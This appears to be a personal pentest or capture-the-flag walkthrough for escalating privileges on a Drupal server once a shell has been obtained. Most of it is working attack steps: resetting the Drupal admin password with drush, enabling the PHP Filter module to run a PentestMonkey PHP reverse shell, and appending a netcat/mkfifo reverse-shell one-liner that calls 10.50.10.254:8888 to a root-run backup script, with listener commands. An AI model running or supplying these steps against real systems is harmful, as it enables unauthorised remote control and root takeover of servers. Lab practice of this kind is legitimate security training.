# If you have CLI access

If you managed to get shell access, browse around the user's directory and see if there are any newly created files.

If there are, there might be pissible cron jobs or other scripts.

Ensure you have a look at ALL files in the user's directory, you might find some hints, for escalation of scripts.

In this example, we have a backup script that makes use of "drush"
drush is a populat app for drupal sysadmin, you can change the password for a drupal users using drush.
drush commands:
```
drush -h
```

Run drush to see all commands you can run.
```
drush
```

change the Drupla admin password:
```
drush user-password admin --password="12345"
```

If you get a error stating you need to run it from a better environment, try changing to the /var/www/html folder and run it again.

Log into the Drupal site using the admin details.
Install a the PHP module if it's not installed.

```
Home > Administrations > Extend > Install new Module
```

Go to drupal.org and downlaod the PHP module (e.g. php-8.x-1.0-beta1.tar.gz)
Browse to the location where the gz file is, upload it and ENABLE the new module

Back on the "List" page, navigate the "PHP Filter" and Install it.

Now,l in the Menu, navigate to:
```
Content > +Add Content > Basic Page
```

Change the content to PHP.
Go to PenTest Monkey and downlaod the PHP Reverse shell code from there.
Change the IP & port number to your desires.
Paste the code into the text box, don't save as yet.

On Kali, start the listener:
```
nc -nlvp 1234
```

Now click on Preview, it should establish a reverse shell.
If it does not, navigate to Content and click on the page you created, it should now open a reverse shell for you.

Spawn a shell
```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Now edit the backup script so that it can create a reverse shell.

You can use 2 mothods here, one where you ahve NC install and another if you don't have NC installed (Check out pentestmonkey reverse shell for info)
with NC:
```
nc -e /bin/sh 10.50.10.254 8888
```

Without NC installed
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.50.10.254 8888 >/tmp/f
```

Add it to the backup file:
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.50.10.254 8888 >/tmp/f' >> backups.sh
```

Start the listener on your Kali box and wait for the conenction
```
nc -nlvp 8888
```

You should have root now
